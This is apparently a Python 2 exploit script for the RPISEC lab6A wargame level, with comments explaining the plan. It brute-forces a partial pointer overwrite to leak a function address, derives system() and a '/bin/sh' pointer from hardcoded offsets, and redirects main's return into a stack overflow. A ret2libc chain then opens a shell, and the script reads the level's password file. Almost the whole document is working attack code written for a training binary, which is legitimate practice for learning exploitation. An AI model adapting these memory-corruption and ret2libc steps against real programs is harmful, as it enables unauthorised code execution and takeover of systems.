#!/usr/bin/python
# coding: utf-8


'''
Exploit for level lab6A
'''


import fcntl
import os
import subprocess
import struct
import threading
import time


#   Observations: There are a couple of interesting functions in the binary
# that are not used in the level which are quite useful to exploit this level.
# Particularly print_name and make_note

#   Exploitation: We will use the bug in setup_account to partially overwrite
# print_listing()'s address with print_name()'s and then use that leaked info
# to compute the address of system() and the pointer to "/bin/sh". Then, we can
# use that bug again to overwrite main()'s return address (since that bug will
# keep cat(ing) the description until we reach main()'s return address) with
# make_note()'s address to leverage the smash stack kind bug in that function
# to craft a ret2libc ROP chain (just call system() with "/bin/sh") and gain
# a beautiful shell


##################
#  Global stuff  #
##################

ins = None
outs = None

# ******* IMPORTANT ********
# The following data depends on how the level is compiled, these are valid
# for the binary compiled in the WarZone (the one provided by RPISEC)
# change these values if yours are different
# Offsets from print_name()
systemoff = 0x19da52  # system() offset
binshoff = 0x7d1be  # Offset of the pointer to "/bin/sh"
makenoteoff = 0x233  # make_note() offset

###############
#  Functions  #
###############


def handleout(p, stuff):
    '''
    This function handles the output of the subprocess.
    '''
    fcntl.fcntl(outs.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)
    stage1 = False
    while p.poll() is None:
        try:
            buf = p.stdout.read()
            if not stage1:
                n = buf.find(' is a ')  # Find the leak
                if n >= 0:
                    stuff['leak'] = buf[n+0x60:buf.find('\nEnter')]
                    stage1 = True
            else:   # Don't echo while bruteforcing to avoid output flooding
                print buf,
        except IOError:
            pass


def writeraw(s):
    '''
    Sends raw bytes through stdin.
    '''
    ins.write(s)
    ins.flush()
    time.sleep(0.1)


def dump(s):
    '''
    Dumps the content of +s+ in a hexadecimal format
    '''
    dmp = ''
    fmt = '%d : 0x%08x 0x%08x 0x%08x 0x%08x | %s\n'
    i = 1
    while s:
        if len(s) < 16:
            s += '\x00' * (16 - len(s))
        num = struct.unpack('IIII', s[:16])
        z = s[:16]
        sane = ''.join('.' if ord(c) < 0x20 or ord(c) > 0x7e else c for c in z)
        dmp += fmt % (i, num[0], num[1], num[2], num[3], sane)
        s = s[16:]
        i += 1

    print dmp


if __name__ == '__main__':

    stuff = {'leak': ''}
    stage1 = threading.Event()

    print '****** STAGE 1 : Trigger memory leak *******'
    print '[STAGE 1] Bruteforcing print_name() address...'
    try:
        while True:
            # If this stage fails, a SEGFAULT is thrown by the child process
            # We have to run it again
            p = subprocess.Popen('/levels/lab06/lab6A', stdin=subprocess.PIPE,
                                 stdout=subprocess.PIPE)

            outs = p.stdout
            ins = p.stdin

            # Prepare a worker to read the child output
            reader = threading.Thread(target=handleout, args=(p, stuff))
            reader.daemon = True
            reader.start()

            # Use the bug of setup_account() to partially overwrite
            # print_listing's address with our print_name() guess
            writeraw('1\n')
            writeraw('A'*0x20)
            writeraw('A'*0x5a+'\xe2\x2b')
            writeraw('3\n')  # Try to call print_name()
            time.sleep(0.5)

            if p.poll() is None:  # If the process is still alive, proceed
                break

        print '[STAGE 1] STAGE 1 COMPLETED!'
        print '[+] Leaked info:'
        dump(stuff['leak'])
        print_name = struct.unpack('I', stuff['leak'][:4])[0]

        print '****** STAGE 2 : Overwrite main()\'s return address ******'
        # Now we have to overwrite main()'s return address with make_note()'s
        # address. In order to do so, we have to leverage the bug in
        # setup_account successively and keep writing values on the stack until
        # we reach the address to overwrite
        make_note = print_name - makenoteoff
        print '[+] make_note() @ 0x%x' % make_note
        print '[STAGE 2] Overwriting return address...'
        writeraw('1\n')
        writeraw('A\n')
        writeraw('AA%s\n' % struct.pack('<I', make_note))
        writeraw('4\n')  # Call make_note
        print '[STAGE 2] STAGE 2 COMPLETED!'

        print '\n****** STAGE 3 : Build ret2libc rop chain ******'
        # First, compute system()'s address and the pointer to "/bin/sh" from
        # the leaked print_name() address
        system = print_name - systemoff
        binsh = print_name - binshoff
        print '[+] system()  @ 0x%x' % system
        print '[+] "/bin/sh" @ 0x%x' % binsh
        # Then, smash the stack and build the rop chain
        writeraw('A'*0x34+'%sAAAA%s\n' % (struct.pack('<I', system),
                                          struct.pack('<I', binsh)))
        print '[STAGE 3] STAGE 3 COMPLETED! lab6A pwned :)'
        print 'flag :',
        writeraw('cat /home/lab6end/.pass\n')

    # Uncomment this to keep the shell
    #    while True:
    #        time.sleep(0.5)
    #        p.stdin.write(raw_input('(shell) ')+'\n')
    #        p.stdin.flush()

    except KeyboardInterrupt:
        print '[+] Ctrl-C requested, shutting down...'
